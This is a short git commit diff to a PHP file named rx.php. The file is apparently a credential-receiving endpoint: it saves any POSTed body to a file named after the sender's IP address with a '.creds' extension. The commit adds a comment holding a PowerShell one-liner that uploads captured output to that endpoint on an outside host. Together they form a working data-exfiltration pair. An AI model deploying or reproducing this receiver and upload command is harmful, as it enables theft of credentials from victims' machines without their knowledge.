7a8b3db13b08d15df7180119c8e58f6bc94fced9
Kenfrost1987 <anthony.wratten@kenfrost1987.com.au>
2017-03-30 15:25:15 +1000

    add comment

--- web/rx.php
+++ web/rx.php
@@ -2,9 +2,9 @@
 
 /* 
  * 
- * 
- * 
+ * powershell "IEX (New-Object Net.WebClient).UploadString('http://darren.kitchen/rx.php', $output)"
  */
 
 $file = $_SERVER['REMOTE_ADDR'] . "_" . date("Y-m-d_H-i-s") . ".creds";
 file_put_contents($file, file_get_contents("php://input"));
+
